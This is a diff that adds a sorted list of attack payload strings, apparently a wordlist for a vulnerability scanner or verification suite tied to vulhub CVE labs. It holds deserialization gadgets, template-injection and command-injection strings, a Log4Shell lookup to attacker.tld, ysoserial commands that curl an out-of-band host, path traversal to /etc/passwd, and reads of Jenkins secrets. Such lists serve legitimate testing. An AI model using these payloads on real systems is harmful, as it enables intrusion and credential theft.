@@ -1,0 +1,61 @@
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<collab>/"]]]]
+!!python/object
+!!python/object/apply:os.system ["id"]
+!ruby/object:
+!ruby/object:Gem::Installer
+${7*7}
+${jndi:ldap://attacker.tld/x}
+(os.system, ('id > /tmp/x',))
+. For ImageMagick CVE-2016 /
+..%2F
+/_layouts/15/
+/bin/sh
+/cgi-bin/
+/etc/passwd
+/functionRouter
+/icons/
+/icons/.%2e/.%2e/.%2e/etc/passwd
+; id
+; sleep 10
+<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+<%= 7*7 %>
+<%= IO.popen('id').read %>
+<%= system('id') %>
+=HYPERLINK("https://<collab>/x","Click")
+=cmd|' /C calc'!A1
+=cmd|'/c calc'!A1
+?file=../../../../etc/passwd
+@/proc/self/environ
+@/var/jenkins_home/credentials.xml
+@/var/jenkins_home/secret.key
+Content-Type: application/x-java-serialized-object
+Content-Type: text/plain
+T(java.lang.Runtime).getRuntime().exec('id')
+WEB-INF/lib
+\x80\x04
+application/vnd.java.serialized-object
+connect-node @/etc/passwd
+docs/verification/apache-cve-2021-41773.md
+docs/verification/jenkins-cve-2024-23897.md
+docs/verification/spring-cve-2022-22963.md
+expandAtFiles=false
+expandAtFiles=true
+frohoff/ysoserial
+globalThis.process.binding('spawn_sync')
+id; uname -a
+new String[]{"cmd","arg"}
+phar://path/to/uploaded.jpg/anything
+process.mainModule.require('child_process').execSync('id')
+subprocess.call(shell=True)
+text/plain
+viewstate=
+vulhub/httpd:CVE-2021-41773
+vulhub/jenkins:2.441
+vulhub/spring-cloud-function:3.2.2
+ysoserial CommonsCollections5 'curl http://<collab>/x'
+ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c 'curl http://<collab>/'
+{"__proto__":{"shell":"/usr/bin/id","outputType":"buffer"}}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
+{{7*7}}
+| id
